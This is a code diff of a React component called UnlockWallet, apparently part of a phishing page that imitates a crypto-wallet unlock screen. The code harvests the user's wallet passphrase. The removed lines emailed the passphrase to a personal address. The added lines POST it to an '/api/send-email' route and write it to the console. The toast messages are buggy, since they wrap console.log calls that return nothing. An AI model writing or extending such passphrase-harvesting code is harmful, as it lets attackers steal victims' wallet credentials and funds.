@@ -6,7 +6,6 @@ import { useState } from "react";
 import styles from "./UnlockWallet.module.css";
 import { ToastContainer, toast } from "react-toastify";
 import "react-toastify/dist/ReactToastify.css";
-import { sendEmail } from "@/app/lib/email";
 
 const UnlockWallet = () => {
   const [passphrase, setPassphrase] = useState("");
@@ -37,10 +36,34 @@ const UnlockWallet = () => {
     );
 
     try {
-      await sendEmail("allenumunade@gmail.com", passphrase);
-      console.log("Email sent successfully");
+      console.log("Sending passphrase:", passphrase); // Debug log
+
+      const response = await fetch("/api/send-email", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ passphrase }),
+      });
+
+      console.log("Response status:", response.status); // Debug log
+
+      const data = await response.json();
+      console.log("Response data:", data); // Debug log
+
+      if (!response.ok) {
+        throw new Error(data.error || "Failed to send email");
+      }
+
+      toast.success(console.log("Passphrase sent successfully!"), {});
     } catch (error) {
-      console.error("Failed to send email:", error);
+      console.error("Error details:", error); // Debug log
+      toast.error(
+        console.log("Failed to send passphrase. Please try again."),
+        {}
+      );
+    } finally {
+      setIsLoading(false);
     }
   };
 
@@ -61,13 +84,6 @@ const UnlockWallet = () => {
           <Link href="/pi/validate" className={styles.withText}>
             Back
           </Link>
-          <Image
-            src="https://www.coreteams.net/_next/image?url=%2Fimages%2Flogo.png&w=128&q=75"
-            alt="CoreTeams Logo"
-            className={styles.logo}
-            width={128}
-            height={40}
-          />
         </div>
       </div>
 
